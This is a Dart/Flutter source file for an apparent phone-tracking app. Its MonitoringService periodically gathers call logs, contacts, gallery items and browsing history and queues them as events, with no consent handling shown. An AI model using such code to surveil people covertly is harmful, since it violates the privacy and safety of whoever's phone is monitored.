import 'package:shared_preferences/shared_preferences.dart';
import '../core/utils/device_id.dart';
import '../core/utils/logger.dart';
import '../models/event_queue_model.dart';
import '../platform/tracking_channel.dart';
import 'event_queue_service.dart';

/// Orchestrates slow-cycle data collection: call logs, contacts, gallery,
/// browsing history. Triggered either manually or when the Kotlin
/// ForegroundService bumps the slow_cycle_ts SharedPreferences key.
class MonitoringService {
  MonitoringService(this._queue);

  final EventQueueService _queue;
  final _ch = TrackingChannel.instance;

  static const _prefsKey       = 'pm_tracking';
  static const _slowCycleTsKey = 'slow_cycle_ts';
  static const _lastCallLogTs  = 'mon_last_call_log_ts';
  static const _lastGalleryTs  = 'mon_last_gallery_ts';
  static const _lastBrowsingTs = 'mon_last_browsing_ts';
  static const _lastContactTs  = 'mon_last_contact_sync_ts';
  static const _lastHandledTs  = 'mon_last_handled_slow_ts';

  bool _busy = false;

  /// Call this periodically (e.g. every 5 min from the sync loop).
  /// Runs a full slow-capture only if the native service has bumped the
  /// slow_cycle_ts since we last handled it.
  Future<void> checkAndCollect() async {
    if (_busy) return;

    final prefs        = await SharedPreferences.getInstance();
    final nativeTs     = prefs.getInt(_slowCycleTsKey) ?? 0;
    final lastHandled  = prefs.getInt(_lastHandledTs)  ?? 0;

    if (nativeTs <= lastHandled) return; // no new slow tick yet

    _busy = true;
    try {
      appLogger.i('MonitoringService: slow cycle detected — collecting');
      await _collectAll(prefs);
      await prefs.setInt(_lastHandledTs, nativeTs);
    } finally {
      _busy = false;
    }
  }

  /// Force a full collection regardless of the slow-cycle timestamp.
  Future<void> collectNow() async {
    if (_busy) return;
    _busy = true;
    try {
      final prefs = await SharedPreferences.getInstance();
      await _collectAll(prefs);
    } finally {
      _busy = false;
    }
  }

  // ── Internal ──────────────────────────────────────────────────────────────

  Future<void> _collectAll(SharedPreferences prefs) async {
    await Future.wait([
      _collectCallLogs(prefs),
      _collectContacts(prefs),
      _collectGallery(prefs),
      _collectBrowsing(prefs),
    ]);
  }

  Future<void> _collectCallLogs(SharedPreferences prefs) async {
    try {
      final since = prefs.getInt(_lastCallLogTs) ?? 0;
      final items = await _ch.getCallLogs(sinceTimestamp: since);
      if (items.isEmpty) return;

      for (final item in items) {
        await _queue.enqueue(EventType.callLog, item);
      }

      final newest = items
          .map((e) => (e['timestamp'] as int?) ?? 0)
          .fold(0, (a, b) => a > b ? a : b);
      if (newest > 0) await prefs.setInt(_lastCallLogTs, newest);

      appLogger.d('MonitoringService: queued ${items.length} call log entries');
    } catch (e) {
      appLogger.w('MonitoringService: call logs failed — $e');
    }
  }

  Future<void> _collectContacts(SharedPreferences prefs) async {
    try {
      final lastSync = prefs.getInt(_lastContactTs) ?? 0;
      // Always collect — contacts don't have timestamps, use full refresh
      // but rate-limit to once per 6 hours
      final sixHours = 6 * 60 * 60 * 1000;
      if (DateTime.now().millisecondsSinceEpoch - lastSync < sixHours) return;

      final items = await _ch.getContacts();
      if (items.isEmpty) return;

      for (final item in items) {
        await _queue.enqueue(EventType.contact, item);
      }

      await prefs.setInt(_lastContactTs, DateTime.now().millisecondsSinceEpoch);
      appLogger.d('MonitoringService: queued ${items.length} contacts');
    } catch (e) {
      appLogger.w('MonitoringService: contacts failed — $e');
    }
  }

  Future<void> _collectGallery(SharedPreferences prefs) async {
    try {
      final since = prefs.getInt(_lastGalleryTs) ?? 0;
      final items = await _ch.getGalleryItems(sinceTimestamp: since);
      if (items.isEmpty) return;

      for (final item in items) {
        await _queue.enqueue(EventType.galleryItem, item);
      }

      final newest = items
          .map((e) => (e['takenAt'] as int?) ?? 0)
          .fold(0, (a, b) => a > b ? a : b);
      if (newest > 0) await prefs.setInt(_lastGalleryTs, newest);

      appLogger.d('MonitoringService: queued ${items.length} gallery items');
    } catch (e) {
      appLogger.w('MonitoringService: gallery failed — $e');
    }
  }

  Future<void> _collectBrowsing(SharedPreferences prefs) async {
    try {
      final since = prefs.getInt(_lastBrowsingTs) ?? 0;
      final items = await _ch.getBrowsingHistory(sinceTimestamp: since);
      if (items.isEmpty) return;

      for (final item in items) {
        await _queue.enqueue(EventType.browsingHistory, item);
      }

      final newest = items
          .map((e) => (e['visitedAt'] as int?) ?? 0)
          .fold(0, (a, b) => a > b ? a : b);
      if (newest > 0) await prefs.setInt(_lastBrowsingTs, newest);

      appLogger.d('MonitoringService: queued ${items.length} browsing entries');
    } catch (e) {
      appLogger.w('MonitoringService: browsing history failed — $e');
    }
  }
}
